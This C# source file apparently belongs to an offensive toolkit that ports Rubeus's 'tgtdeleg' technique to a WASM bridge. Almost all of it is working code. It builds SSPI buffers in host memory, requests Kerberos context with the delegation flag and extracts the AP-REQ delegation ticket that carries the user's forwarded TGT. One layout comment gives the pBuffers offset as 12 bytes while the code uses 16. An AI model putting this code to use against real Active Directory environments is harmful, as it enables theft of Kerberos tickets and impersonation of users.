// WfSspi.cs — high-level wrapper around secur32.dll SSPI for Rubeus
// `tgtdeleg`, replacing the nested-pointer SecBufferDesc chain (which
// the upstream Interop.cs constructs in WASM linear memory) with a
// HOST-memory layout that survives the bridge boundary.
//
// Why this exists:
//   • wf_call translates top-level WASM-pointer args to host pointers
//     (internal/hostmod/win32_windows_dll.go:1121 — values in the range
//     [0x10000, wasmMemSize) get replaced by wasmMemBase + offset).
//   • SecBufferDesc { ulVersion, cBuffers, pBuffers } embeds pBuffers,
//     which is a host pointer to SecBuffer[]. Each SecBuffer in turn
//     embeds pvBuffer (host pointer to bytes).
//   • Nested pointers stay as WASM addresses on the host side because
//     wf_call's translation only touches the immediate arg list, not
//     fields inside structs.
//
// Workaround: build SecBufferDesc + SecBuffer[] + the output token
// buffer entirely in host memory via WfHost.HostAlloc, write the field
// values via WfHost.HostWriteUInt32/UInt64, then pass the
// SecBufferDesc's REAL host address as the wf_call arg. Because the
// address is >= wasmMemSize, wf_call leaves it alone — the host's
// secur32!InitializeSecurityContextW receives a fully-resolved nested
// struct chain.
//
// Host-side layout (one SecBuffer):
//   +0  ulVersion   = 0  (SECBUFFER_VERSION)
//   +4  cBuffers    = 1
//   +8  pBuffers    = address of SecBuffer[0] (12 bytes after SecBufferDesc)
//   +16 cbBuffer    = caller-provided token-buffer size
//   +20 BufferType  = 2 (SECBUFFER_TOKEN)
//   +24 pvBuffer    = address of token buffer
//   +32 (16+16)     = aligned SecBuffer struct end
//
// Token buffer: a separate HostAlloc of `cbBuffer` bytes.

using System;
using System.Runtime.InteropServices;

namespace WasmForge.Helpers
{
    // Local SSPI struct definitions so this helper compiles in projects
    // that don't ship Rubeus's Interop.cs (and vice-versa, to avoid
    // accidentally taking dependencies on Rubeus's struct layout).
    // SEC_HANDLE and SECURITY_INTEGER are 16 bytes / 8 bytes
    // respectively on x64 — wasm32 layout matches because both fields
    // are explicit ulong / uint pairs.

    [StructLayout(LayoutKind.Sequential)]
    public struct WfSecHandle
    {
        public ulong LowPart;
        public ulong HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct WfSecurityInteger
    {
        public uint LowPart;
        public int  HighPart;
    }

    /// <summary>
    /// SecBufferDesc + SecBuffer[] container that lives entirely in
    /// host memory. Disposable — releases both backing host buffers on
    /// Dispose.
    /// </summary>
    public sealed class HostSecBufferDesc : IDisposable
    {
        public int DescHandle { get; }
        public int TokenHandle { get; }
        public uint TokenSize { get; }
        public ulong DescAddr { get; }   // real host address of SecBufferDesc

        private bool _disposed;

        private HostSecBufferDesc(int descHandle, int tokenHandle,
            uint tokenSize, ulong descAddr)
        {
            DescHandle = descHandle;
            TokenHandle = tokenHandle;
            TokenSize = tokenSize;
            DescAddr = descAddr;
        }

        /// <summary>
        /// Allocate a SecBufferDesc with one SecBuffer (typed
        /// SECBUFFER_TOKEN, ISC's default for InitializeSecurityContext)
        /// referring to a token buffer of `tokenSize` bytes.
        /// </summary>
        public static HostSecBufferDesc AllocateTokenBuffer(int tokenSize)
        {
            // 12 bytes SecBufferDesc + 16 bytes SecBuffer + 4 padding = 32
            int descHandle = WfHost.HostAlloc(32);
            int tokenHandle = WfHost.HostAlloc(tokenSize);
            ulong descAddr  = WfHost.GetHostAddress(descHandle);
            ulong tokenAddr = WfHost.GetHostAddress(tokenHandle);

            // SecBufferDesc { ulVersion=0, cBuffers=1, pBuffers=&secBuffer[0] }
            WfHost.HostWriteUInt32(descHandle, 0,  0);          // ulVersion = 0
            WfHost.HostWriteUInt32(descHandle, 4,  1);          // cBuffers = 1
            WfHost.HostWriteUInt64(descHandle, 8,  descAddr + 16); // pBuffers → SecBuffer at +16

            // SecBuffer { cbBuffer=tokenSize, BufferType=2 SECBUFFER_TOKEN, pvBuffer=tokenAddr }
            WfHost.HostWriteUInt32(descHandle, 16, (uint)tokenSize); // cbBuffer
            WfHost.HostWriteUInt32(descHandle, 20, 2);                // BufferType = SECBUFFER_TOKEN
            WfHost.HostWriteUInt64(descHandle, 24, tokenAddr);        // pvBuffer

            return new HostSecBufferDesc(descHandle, tokenHandle,
                (uint)tokenSize, descAddr);
        }

        /// <summary>Read the rendered token bytes after the API call.</summary>
        public byte[] ReadToken()
        {
            // After the call, cbBuffer may be smaller than TokenSize
            // (the API writes only used length). Read the current
            // cbBuffer first, then HostRead that many bytes from the
            // token buffer.
            byte[] hdr = WfHost.HostRead(DescHandle, 16, 4);
            uint actualLen = BitConverter.ToUInt32(hdr, 0);
            if (actualLen == 0 || actualLen > TokenSize) actualLen = TokenSize;
            return WfHost.HostRead(TokenHandle, 0, (int)actualLen);
        }

        public void Dispose()
        {
            if (_disposed) return;
            _disposed = true;
            if (DescHandle != 0)  WfHost.HostFree(DescHandle);
            if (TokenHandle != 0) WfHost.HostFree(TokenHandle);
        }
    }

    /// <summary>
    /// WfSspi — high-level Kerberos GSS-API helper. The current single
    /// entry-point (RequestFakeDelegTicket) is a drop-in replacement
    /// for Rubeus's LSA.RequestFakeDelegTicket which builds the
    /// SecBufferDesc chain in WASM memory (crashes the bridge under
    /// NativeAOT-WASI). This implementation builds the chain in host
    /// memory and reads the token bytes back via WfHost.HostRead.
    /// </summary>
    public static unsafe class WfSspi
    {
        // Constants from secur32.h
        public const int SECPKG_CRED_OUTBOUND   = 2;
        public const int SECURITY_NATIVE_DREP   = 0x00000010;
        public const int SEC_E_OK               = 0;
        public const int SEC_I_CONTINUE_NEEDED  = 0x00090312;
        public const int ISC_REQ_DELEGATE       = 0x1;
        public const int ISC_REQ_MUTUAL_AUTH    = 0x2;
        public const int ISC_REQ_ALLOCATE_MEMORY = 0x100;

        // Kerberos OID for unwrapping the AP-REQ from the GSS-API blob.
        // Reference: kekeo — https://github.com/gentilkiwi/kekeo/blob/master/kekeo/modules/kuhl_m_tgt.c#L329-L345
        private static readonly byte[] KerberosOid = {
            0x06, 0x09, 0x2a, 0x86, 0x48, 0x86, 0xf7, 0x12, 0x01, 0x02, 0x02
        };

        // ── Bridge: InitializeSecurityContextW with host pOutput ──
        //
        // Maps to WfSspi_InitializeSecurityContext_HostOutput in
        // dotnet/bridge/pinvoke_secur32_ext.c. pOutputHost is a HOST
        // address (returned by WfHost.GetHostAddress on a SecBufferDesc
        // allocated via HostSecBufferDesc.AllocateTokenBuffer) — passing
        // an IntPtr (4 bytes on wasm32) would truncate the upper half.

        // Bridge exports the bare name `AcquireCredentialsHandle`
        // (which internally calls AcquireCredentialsHandleW on the
        // host). DllImport EntryPoint must match the C symbol.
        [DllImport("secur32.dll", EntryPoint = "AcquireCredentialsHandle", CharSet = CharSet.Unicode)]
        private static extern int AcquireCredentialsHandle_Wf(
            string pPrincipal, string pPackage, uint fCredentialUse,
            IntPtr pvLogonID, IntPtr pAuthData, IntPtr pGetKeyFn,
            IntPtr pvGetKeyArgument,
            ref WfSecHandle phCredential, ref WfSecurityInteger ptsExpiry);

        [DllImport("secur32.dll", EntryPoint = "WfSspi_InitializeSecurityContext_HostOutput")]
        private static extern uint WfSspi_InitializeSecurityContext_HostOutput(
            ref WfSecHandle phCredential,
            IntPtr phContext,
            string pTargetName,
            uint fContextReq,
            uint Reserved1,
            uint TargetDataRep,
            IntPtr pInput,
            uint Reserved2,
            ref WfSecHandle phNewContext,
            ulong pOutputHost,
            ref uint pfContextAttr,
            ref WfSecurityInteger ptsExpiry);

        /// <summary>
        /// RequestFakeDelegTicket — drop-in replacement for
        /// Rubeus's LSA.RequestFakeDelegTicket using HOST-memory
        /// SecBufferDesc construction (avoids the nested-pointer
        /// marshaling crash that the upstream BCL path hits under
        /// NativeAOT-WASI).
        ///
        /// Returns the AP-REQ Kerberos blob extracted from the
        /// GSS-API output, or null on any failure. The caller is
        /// responsible for cache extraction (LsaCallAuthenticationPackage)
        /// — this helper only handles the SSPI dance to populate the
        /// cache with the unconstrained delegation ticket.
        /// </summary>
        public static byte[] RequestFakeDelegTicket(string targetSPN, bool display = true)
        {
            if (string.IsNullOrEmpty(targetSPN))
            {
                if (display) Console.WriteLine("[X] WfSspi.RequestFakeDelegTicket: targetSPN required");
                return null;
            }

            var phCredential = new WfSecHandle();
            var ptsExpiry    = new WfSecurityInteger();
            const uint SECPKG_CRED_OUTBOUND_FLAG = 2;

            int status = AcquireCredentialsHandle_Wf(
                null, "Kerberos", SECPKG_CRED_OUTBOUND_FLAG,
                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
                ref phCredential, ref ptsExpiry);
            if (status != 0)
            {
                if (display) Console.WriteLine($"[X] AcquireCredentialsHandle failed: 0x{status:X}");
                return null;
            }

            using (var hostBuf = HostSecBufferDesc.AllocateTokenBuffer(12288))
            {
                var phNewContext = new WfSecHandle();
                uint ctxAttrs = 0;
                var lifetime  = new WfSecurityInteger();

                const uint ISC_REQ_ALL = (uint)(ISC_REQ_ALLOCATE_MEMORY
                                              | ISC_REQ_DELEGATE
                                              | ISC_REQ_MUTUAL_AUTH);

                if (display)
                {
                    Console.WriteLine($"[*] Initializing Kerberos GSS-API w/ fake delegation for target '{targetSPN}'");
                }

                int rc = (int)WfSspi_InitializeSecurityContext_HostOutput(
                    ref phCredential,
                    IntPtr.Zero,
                    targetSPN,
                    ISC_REQ_ALL,
                    0,
                    (uint)SECURITY_NATIVE_DREP,
                    IntPtr.Zero,
                    0,
                    ref phNewContext,
                    hostBuf.DescAddr,
                    ref ctxAttrs,
                    ref lifetime);

                if (rc != SEC_E_OK && rc != SEC_I_CONTINUE_NEEDED)
                {
                    if (display) Console.WriteLine($"[X] InitializeSecurityContext failed: 0x{rc:X}");
                    return null;
                }
                if (display) Console.WriteLine("[+] Kerberos GSS-API initialization success!");

                if ((ctxAttrs & (uint)ISC_REQ_DELEGATE) == 0)
                {
                    if (display) Console.WriteLine("[X] Delegation flag not honored — target may not be configured for unconstrained delegation");
                    return null;
                }
                if (display) Console.WriteLine("[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.");

                byte[] gssBlob = hostBuf.ReadToken();
                byte[] apReq   = ExtractApReq(gssBlob);
                if (apReq == null)
                {
                    if (display) Console.WriteLine("[X] Could not extract AP-REQ from GSS-API output");
                    return null;
                }
                if (display) Console.WriteLine("[*] Found the AP-REQ delegation ticket in the GSS-API output.");
                return apReq;
            }
        }

        /// <summary>
        /// Locate the Kerberos AP-REQ blob inside a GSS-API output
        /// token by searching for the Kerberos OID then advancing
        /// past the 2-byte mech-type field.
        /// </summary>
        public static byte[] ExtractApReq(byte[] gssBlob)
        {
            if (gssBlob == null || gssBlob.Length < KerberosOid.Length + 2)
                return null;
            for (int i = 0; i < gssBlob.Length - KerberosOid.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < KerberosOid.Length; j++)
                {
                    if (gssBlob[i + j] != KerberosOid[j]) { match = false; break; }
                }
                if (!match) continue;
                // Skip past OID + 2-byte mech-type tag, the rest is the AP-REQ.
                int apReqStart = i + KerberosOid.Length + 2;
                if (apReqStart >= gssBlob.Length) return null;
                int apReqLen = gssBlob.Length - apReqStart;
                byte[] apReq = new byte[apReqLen];
                Array.Copy(gssBlob, apReqStart, apReq, 0, apReqLen);
                return apReq;
            }
            return null;
        }
    }
}
